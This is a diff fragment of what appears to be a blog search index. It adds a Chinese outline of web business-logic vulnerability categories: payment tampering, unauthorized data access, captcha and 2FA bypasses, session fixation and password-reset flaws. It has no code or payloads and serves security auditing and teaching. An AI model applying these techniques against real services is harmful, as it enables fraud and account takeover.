+绕过交易限制、刷取账户余额
+Cookie&#x2F;Session设计缺陷导致任意账号登录
+强制浏览、流程顺序缺陷，遍历数据
+时间校验缺陷（如12306刷票）
+
+（4）越权分类
+新增数据越权
+删除数据越权（如删除他人素材）
+修改数据越权（篡改用户信息）
+查询数据越权（批量泄露信息）
+URL&#x2F;参数越权
+
+（5）验证码安全问题
+客户端实现、可直接绕过&#x2F;爆破
+服务端验证码可重复使用、可预测
+万能验证码、验证码在请求包明文展示
+验证码强度低，可被OCR识别
+无次数、时效限制，可无限爆破
+
+（6）JS敏感信息泄露
+JS文件泄露后台路径、接口API
+前端JS窃取受保护Cookie
+AJAX、前端脚本泄露手机号、邮箱等隐私
+
+3、逻辑漏洞分类梳理（1）交易类
+修改支付价格
+修改支付状态
+修改&#x2F;负数化购买数量
+篡改金额为负数
+请求重放攻击
+数据库并发锁处理不当
+
+（2）业务风控类
+刷取优惠券、重复享受优惠
+套现类漏洞
+
+（3）账号注册类
+重复注册、账号覆盖
+用户名遍历猜解
+
+（4）密码相关
+密码明文存储、未做哈希加密
+无密码强度校验
+
+（5）账号信息类
+用户名&#x2F;邮箱前后空格、大小写处理不当
+手机号格式校验缺陷（如+86前缀绕过）
+
+（6）Cookie&#x2F;Session类
+Cookie存储敏感数据
+Cookie&#x2F;Session可伪造、无合法性校验
+
+（7）登录类
+撞库攻击
+账号劫持
+恶意锁号（无解锁机制）
+传输信道不安全
+凭证本地不安全存储
+
+（8）密码找回类
+越权重置任意密码
+新密码在响应包明文返回
+Token前端可控、无服务端强校验
+头部字段处理不当引发漏洞
+找回流程泄露敏感信息
+
+（9）修改密码类
+越权修改他人密码
+无需验证旧密码即可改密
+
+（10）申诉类
+身份伪造
+申诉流程绕过
+
+（11）信息查询&#x2F;更新类
+越权查询、修改数据
+ID可枚举，批量遍历用户数据
+
+（12）双因素认证(2FA)漏洞
+改密&#x2F;登录后自动跳过二次验证
+OAuth登录未开启2FA
+2FA验证码可爆破、存在竞争条件
+返回值篡改绕过
+链接、功能可绕过2FA
+CSRF攻击禁用2FA
+
+（13）验证码漏洞汇总
+可重用、可预测、无时效&#x2F;次数限制
+客户端生成&#x2F;校验、前端直接绕过
+数据包明文展示验证码
+强度低可被机器识别
+特殊参数绕过、可用于短信&#x2F;邮件轰炸
+
+（14）Session漏洞
+Session可猜测、伪造、泄露
+Session固定攻击
+
+（15）越权细分
+未授权访问
+水平越权（同权限用户互访）
+垂直越权（低权限访问高权限）
+交叉越权
+
+（16）其他漏洞
+ID、随机数生成规则简单，可枚举&#x2F;预测
+接口无访问次数、权限限制
+加密算法误用
+业务执行顺序缺陷
+各类敏感信息泄露
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>逻辑漏洞</category>
+      </categories>
+      <tags>
+        <tag>逻辑漏洞</tag>
       </tags>
   </entry>
 </search>
